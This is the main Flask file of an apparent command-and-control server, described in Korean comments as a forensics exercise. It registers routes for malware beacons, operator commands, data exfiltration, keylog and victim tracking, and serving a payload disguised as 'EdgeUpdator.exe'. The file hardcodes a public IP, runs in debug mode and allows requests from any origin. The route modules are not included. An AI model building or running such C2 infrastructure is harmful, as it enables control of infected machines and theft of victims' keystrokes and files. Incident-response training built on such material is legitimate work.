#!/usr/bin/env python3
## app.py (API Only Version)
"""
C2 Server - API 전용 버전 (침해사고 대응 연습용)
프론트엔드 제거, 백엔드 API만 유지
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import logging

# 로그 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/server.log'),
        logging.StreamHandler()
    ]
)

# Flask 앱 생성
app = Flask(__name__)
app.secret_key = 'your-secret-key-change-this'

# JSON 설정 - 한 줄로 출력
app.config['JSONIFY_PRETTYPRINT_REGULAR'] = False


# CORS 설정 (API 접근용)
CORS(app, resources={
    r"/*": {
        "origins": "*",
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization", "User-Agent"]
    }
})

# 요청 로깅 미들웨어
@app.before_request
def log_request_info():
    """모든 요청 로깅"""
    logging.info(f"🌐 {request.method} {request.path} from {request.remote_addr}")
    if request.method == 'POST':
        logging.info(f"📝 Form data: {dict(request.form)}")
        logging.info(f"📁 Files: {list(request.files.keys())}")

# 필요한 디렉토리 생성
for directory in ['uploads', 'uploads/exfil', 'downloads', 'logs']:
    os.makedirs(directory, exist_ok=True)

# 라우트 모듈 import 및 등록
try:
    from routes.download import download_bp
    from routes.upload import upload_bp
    from routes.c2 import c2_bp
    
    app.register_blueprint(download_bp)
    app.register_blueprint(upload_bp)
    app.register_blueprint(c2_bp)
    
    print("✅ 모든 라우트 등록 완료")
    
except Exception as e:
    print(f"❌ 라우트 등록 실패: {e}")

@app.route('/')
def index():
    """기본 페이지 - Not Found"""
    from flask import Response
    return Response('{"detail":"Not Found"}', mimetype='application/json')

# API 엔드포인트 목록 확인
@app.route('/api')
def api_info():
    """사용 가능한 API 엔드포인트 목록"""
    return jsonify({
        'api_version': '2.0',
        'endpoints': {
            'victim_management': {
                'list_victims': 'GET /api/victims',
                'victim_detail': 'GET /api/victims/<victim_id>',
                'keylog_analysis': 'GET /api/keylog/<data_id>'
            },
            'malware_data': {
                'beacons': 'GET /api/beacons',
                'commands': 'GET /api/commands', 
                'exfiltrations': 'GET /api/exfiltrations',
                'exfil_detail': 'GET /api/exfiltrations/detail/<data_id>'
            },
            'c2_operations': {
                'beacon_endpoint': 'GET/POST /beacon',
                'command_endpoint': 'GET/POST /command',
                'exfil_endpoint': 'POST /exfil',
                'powershell_report': 'POST /report'
            },
            'file_operations': {
                'download_payload': 'GET /download?f=exe|powershell',
                'malware_exe': 'GET /report/EdgeUpdator.exe',
                'upload_data': 'POST /upload'
            },
            'system_info': {
                'server_status': 'GET /status',
                'system_stats': 'GET /api/system/info'
            }
        },
        'note': 'This is a forensics exercise C2 server - API only version'
    })

# 등록된 라우트 확인용 디버깅 엔드포인트
@app.route('/debug/routes')
def debug_routes():
    """등록된 모든 라우트 확인 (JSON 형태)"""
    import urllib
    routes = []
    
    for rule in app.url_map.iter_rules():
        methods = ','.join(rule.methods - {'HEAD', 'OPTIONS'})
        routes.append({
            'endpoint': rule.endpoint,
            'methods': methods,
            'path': urllib.parse.unquote(str(rule))
        })
    
    return jsonify({
        'total_routes': len(routes),
        'routes': sorted(routes, key=lambda x: x['path'])
    })

# 시스템 정보 API (간단한 버전)
@app.route('/api/system/info')
def get_system_info():
    """시스템 정보 API"""
    try:
        import psutil
        return jsonify({
            'cpu_percent': psutil.cpu_percent(interval=1),
            'memory_percent': psutil.virtual_memory().percent,
            'disk_percent': psutil.disk_usage('/').percent,
            'timestamp': request.remote_addr
        })
    except ImportError:
        return jsonify({
            'error': 'psutil not available',
            'timestamp': request.remote_addr
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    print("🚀 C2 Server API 시작! (침해사고 대응 연습용)")
    print("📍 API 서버: http://13.125.103.41:8000")
    print("📊 상태 확인: http://13.125.103.41:8000/status")
    print("🔍 API 목록: http://13.125.103.41:8000/api")
    print("🔧 라우트 확인: http://13.125.103.41:8000/debug/routes")
    print("")
    print("=== 주요 엔드포인트 ===")
    print("• 피해자 목록: GET /api/victims")
    print("• 비콘 로그: GET /api/beacons") 
    print("• 명령 로그: GET /api/commands")
    print("• 유출 데이터: GET /api/exfiltrations")
    print("• 서버 상태: GET /status")
    print("• 페이로드 다운로드: GET /download?f=exe")
    print("")
    
    app.run(host='0.0.0.0', port=8000, debug=True)